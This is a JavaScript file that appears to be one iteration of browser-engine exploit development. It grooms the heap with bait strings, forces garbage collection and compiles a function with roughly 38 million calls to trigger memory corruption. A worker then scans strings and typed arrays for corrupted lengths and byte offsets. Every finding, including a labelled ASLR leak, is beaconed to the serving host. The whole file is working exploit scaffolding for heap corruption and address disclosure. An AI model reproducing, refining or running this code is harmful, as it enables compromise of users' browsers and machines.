// p478 — Scan BEFORE function call (p466c groom + compilation only)
//
// V477 crash: function call → SIGSEGV before scan runs
// Fix: scan after compilation, before call. The finishCreation sweep
// should have already written entry data (thunk, bytecodeIndex).
// If heavy GC freed baits → metadata in bait hole → sweep reaches worker.
//
// ALSO: worker busy-loop watches during function call as backup,
// beaconing results concurrently before crash kills process.
//
// Beacon prefix: V478-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V478-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  var workerCode = function() {
    var strings = [];
    var views = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V478-W-' + tag, false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body || '');
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strings.push(s);
        }
        for (var i = 0; i < 700; i++) {
          views.push(new Uint8Array(new ArrayBuffer(8)));
        }
        beacon('ALLOC-s' + strings.length + '-v' + views.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'scan') {
        // Full scan — check strings and views
        var strHits = 0, strLens = [];
        for (var i = 0; i < strings.length; i++) {
          try {
            var len = strings[i].length;
            if (len !== STR_LEN) {
              strHits++;
              if (strLens.length < 5) strLens.push(i + ':' + len);
            }
          } catch(ex) {
            strHits++;
            if (strLens.length < 5) strLens.push(i + ':ERR');
          }
        }
        var boffHits = 0, boffErrs = 0, boffVals = [];
        for (var i = 0; i < views.length; i++) {
          try {
            var off = views[i].byteOffset;
            if (off !== 0) {
              boffHits++;
              if (boffVals.length < 10) boffVals.push(i + ':' + off);
            }
          } catch(ex) { boffErrs++; }
        }
        var vlenHits = 0, vlenVals = [];
        for (var i = 0; i < views.length; i++) {
          try {
            var vl = views[i].length;
            if (vl !== 8) {
              vlenHits++;
              if (vlenVals.length < 5) vlenVals.push(i + ':' + vl);
            }
          } catch(ex) {}
        }
        self.postMessage({
          type: 'scan-result', phase: e.data.phase,
          strHits: strHits, strLens: strLens,
          boffHits: boffHits, boffErrs: boffErrs, boffVals: boffVals,
          vlenHits: vlenHits, vlenVals: vlenVals
        });
        return;
      }
      if (e.data.cmd === 'watch') {
        // Busy-loop watch: detect corruption during function call
        beacon('WATCHING');
        var maxIter = 10000000;
        var found = false;
        for (var iter = 0; iter < maxIter && !found; iter++) {
          for (var i = 0; i < strings.length; i++) {
            try {
              if (strings[i].length !== STR_LEN) {
                beacon('LIVE-STR-' + i + '-len' + strings[i].length);
                found = true;
                break;
              }
            } catch(ex) { found = true; break; }
          }
          if (!found) {
            for (var i = 0; i < views.length; i++) {
              try {
                if (views[i].byteOffset !== 0) {
                  beacon('LIVE-BOFF-' + i + '-val' + views[i].byteOffset);
                  found = true;
                  break;
                }
              } catch(ex) {}
            }
          }
          if (iter > 0 && iter % 2000000 === 0) beacon('POLL-' + iter);
        }
        if (!found) beacon('WATCH-TIMEOUT-' + maxIter);
        // Full scan after detection
        self.postMessage({ type: 'request-scan', phase: 'post-call' });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      phaseFreeBaits();
    } else if (e.data.type === 'scan-result') {
      reportResults(e.data);
    } else if (e.data.type === 'request-scan') {
      worker.postMessage({ cmd: 'scan', phase: e.data.phase });
    }
  };

  // Phase 1: Bait strings (exact p466c)
  var N_BAIT = 20;
  var STR_LEN = 100000;
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAITS-' + N_BAIT);
  worker.postMessage({ cmd: 'alloc' });

  // Phase 2: Free baits + heavy GC (exact p466c pattern)
  function phaseFreeBaits() {
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;
    B('FREED');
    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-' + gcRound);
        phaseBuild();
      }
    }
    gcPressureRound();
  }

  // Phase 3: Compile + scan BEFORE call
  function phaseBuild() {
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';
    var parts = ['window.__p478fn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__p478ok=true;');
    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p478ok ? 'OK' : 'FAIL'));

      // SCAN 1: immediately after compilation, BEFORE function call
      worker.postMessage({ cmd: 'scan', phase: 'post-compile' });

      // Phase 4: After scan result, start watch + call
      // (handled in onmessage -> reportResults)
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }

  var scanCount = 0;
  function reportResults(r) {
    scanCount++;
    var phase = r.phase || 'unknown';
    B(phase + '-STR', r.strHits + '-of-14');
    if (r.strLens.length > 0) B(phase + '-LENS', r.strLens.join('|'));
    B(phase + '-BOFF', 'h=' + r.boffHits + ',e=' + r.boffErrs);
    if (r.boffVals.length > 0) B(phase + '-BVALS', r.boffVals.join('|'));
    B(phase + '-VLEN', '' + r.vlenHits);
    if (r.vlenVals.length > 0) B(phase + '-VLVALS', r.vlenVals.join('|'));

    if (r.boffHits > 0) {
      B('ASLR-LEAK-' + phase, r.boffVals[0]);
    }

    // After post-compile scan, start the busy-loop watch + call
    if (phase === 'post-compile') {
      B('SUMMARY-COMPILE', 'str=' + r.strHits + ',boff=' + r.boffHits + ',vlen=' + r.vlenHits);

      if (r.strHits > 0 || r.boffHits > 0 || r.vlenHits > 0) {
        B('CORRUPTION-AT-COMPILE', 'YES');
        // Skip function call — we already have results
      } else {
        B('CORRUPTION-AT-COMPILE', 'NO-trying-call');
        // Start worker watching, then call function
        worker.postMessage({ cmd: 'watch' });
        setTimeout(function() {
          B('CALLING');
          try {
            window.__p478fn(function(){});
          } catch(ex) {
            B('CATCH-' + (ex.message || '').substring(0, 40));
          }
          B('SURVIVED');
          // Post-call scan
          worker.postMessage({ cmd: 'scan', phase: 'post-call' });
        }, 500);
      }
    } else if (phase === 'post-call') {
      B('SUMMARY-CALL', 'str=' + r.strHits + ',boff=' + r.boffHits + ',vlen=' + r.vlenHits);
    }

    B('DONE-' + phase);
  }
})();
